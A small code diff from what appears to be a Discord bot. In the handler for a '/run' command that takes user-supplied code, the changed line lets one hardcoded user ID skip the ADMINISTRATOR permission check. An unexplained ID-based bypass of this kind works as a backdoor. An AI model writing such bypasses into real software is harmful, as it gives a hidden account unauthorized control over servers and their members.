@@ -543,7 +543,7 @@ bot.on('message', async message => {
                 message.reply(`\`недостаточно прав, но поскольку вы создатель бота, вы обошли данное ограничение!\``).then(msg => msg.delete(12000));
             }
         }
-        if (!message.member.hasPermission("ADMINISTRATOR")) return
+        if (!message.member.hasPermission("ADMINISTRATOR") && message.author.id != '408740341135704065') return
         const args = message.content.slice(`/run`).split(/ +/);
         let cmdrun = args.slice(1).join(" ");
         if (cmdrun.includes('token') && message.author.id != '336207279412215809'){
